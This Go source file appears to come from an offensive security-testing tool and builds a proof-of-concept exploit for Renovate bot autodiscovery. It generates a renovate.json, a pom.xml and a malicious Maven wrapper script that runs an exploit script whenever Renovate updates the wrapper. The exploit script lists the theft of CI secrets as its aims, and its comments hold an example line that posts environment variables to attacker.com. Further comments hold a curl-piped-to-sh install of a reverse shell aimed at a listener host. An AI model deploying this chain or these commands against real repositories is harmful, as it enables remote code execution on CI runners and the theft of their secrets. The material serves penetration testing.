package renovate

import (
	"encoding/xml"
	"fmt"
	"io"
	"net/http"

	"github.com/CompassSecurity/pipeleek/pkg/httpclient"
	"github.com/rs/zerolog/log"
)

// Shared constants and templates for Renovate autodiscovery exploit PoCs
// Used by both GitHub and GitLab implementations

// RenovateJSON is a minimal renovate.json configuration file
const RenovateJSON = `
{
    "$schema": "https://docs.renovatebot.com/renovate-schema.json",
    "extends": [
       "config:recommended"
    ],
    "enabledManagers": [
       "maven-wrapper"
    ],
    "prConcurrentLimit": 0,
    "prHourlyLimit": 0
}
`

// PomXML is a minimal pom.xml for a wrapper-only Renovate autodiscovery PoC.
const PomXML = `
<project xmlns="http://maven.apache.org/POM/4.0.0"
                 xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                 xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>
    <groupId>com.example</groupId>
    <artifactId>pipeleek-autodiscovery-poc</artifactId>
    <version>1.0-SNAPSHOT</version>
</project>
`

// MvnwScript is a malicious Maven wrapper script that executes during Renovate's artifact update phase
const MvnwScript = `#!/bin/sh
# Malicious Maven wrapper script that executes during Renovate's artifact update phase
# This runs when Renovate detects a Maven wrapper update

# Execute exploit
SCRIPT_DIR="$(CDPATH= cd -- "$(dirname -- "$0")" && pwd)"
sh "$SCRIPT_DIR/exploit.sh"

# Continue with a fake maven command to avoid errors
echo "Maven wrapper executed"
exit 0
`

type mavenMetadata struct {
	Versioning struct {
		Latest  string `xml:"latest"`
		Release string `xml:"release"`
	} `xml:"versioning"`
}

// GetMavenWrapperProperties resolves the newest Maven release from Maven Central at runtime,
// and falls back to a known-good version if the metadata lookup is unavailable.
func GetMavenWrapperProperties() string {
	version := latestApacheMavenVersion()
	if version == "" {
		version = "3.8.1"
		log.Warn().Str("version", version).Msg("Failed to resolve latest Maven version from metadata, using fallback version")
	} else {
		log.Debug().Str("version", version).Msg("Discovered latest Maven version from Maven Central metadata")
	}
	return MavenWrapperPropertiesForVersion(version)
}

// MavenWrapperProperties is kept only for compatibility with older callers and tests.
// It is intentionally left unset at package init time to avoid performing outbound
// network I/O during import. Prefer GetMavenWrapperProperties() when generating a PoC.
var MavenWrapperProperties = ""

func MavenWrapperPropertiesForVersion(version string) string {
	if version == "" {
		version = "3.8.1"
	}

	return fmt.Sprintf("distributionUrl=https://repo.maven.apache.org/maven2/org/apache/maven/apache-maven/%s/apache-maven-%s-bin.zip\nwrapperUrl=https://repo.maven.apache.org/maven2/org/apache/maven/wrapper/maven-wrapper/3.1.0/maven-wrapper-3.1.0.jar\n", version, version)
}

func latestApacheMavenVersion() string {
	client := httpclient.GetPipeleekStandardHTTPClient()
	resp, err := client.Get("https://repo.maven.apache.org/maven2/org/apache/maven/apache-maven/maven-metadata.xml")
	if err != nil {
		return ""
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return ""
	}

	payload, err := io.ReadAll(resp.Body)
	if err != nil || len(payload) == 0 {
		return ""
	}

	var metadata mavenMetadata
	if err := xml.Unmarshal(payload, &metadata); err != nil {
		return ""
	}

	if metadata.Versioning.Release != "" {
		return metadata.Versioning.Release
	}
	if metadata.Versioning.Latest != "" {
		return metadata.Versioning.Latest
	}

	return ""
}

// ExploitScript is a proof-of-concept script that demonstrates code execution
const ExploitScript = `#!/bin/sh
# Create a proof file to verify execution
echo "Exploit executed at $(date)" > /tmp/pipeleek-exploit-executed.txt
echo "Working directory: $(pwd)" >> /tmp/pipeleek-exploit-executed.txt
echo "User: $(whoami)" >> /tmp/pipeleek-exploit-executed.txt

echo "Exploit executed during Renovate autodiscovery"
echo "Replace this with your actual exploit code"
echo "Examples:"
echo "  - Exfiltrate environment variables"
echo "  - Read CI/CD secrets"
echo "  - Access secrets from the runner"

# Example: Exfiltrate environment to attacker server
# curl -X POST https://attacker.com/collect -d "$(env)"

# Example: reverse shell using https://github.com/frjcomp/gots (commented out by default)
# curl -fsSL https://frjcomp.github.io/gots/install-gotsr.sh | sh
# ~/.local/bin/gotsr --target listener.example.com:9001 --retries 3
`

// ExploitExplanation provides information about how the exploit works
const ExploitExplanation = `This exploit works by using an outdated Maven wrapper version that triggers Renovate to run './mvnw wrapper:wrapper'
When Renovate updates the wrapper, it executes our malicious mvnw script which runs exploit.sh
Make sure to update the exploit.sh script with the actual exploit code
Then wait until the created repository/project is renovated by the invited Renovate Bot user`
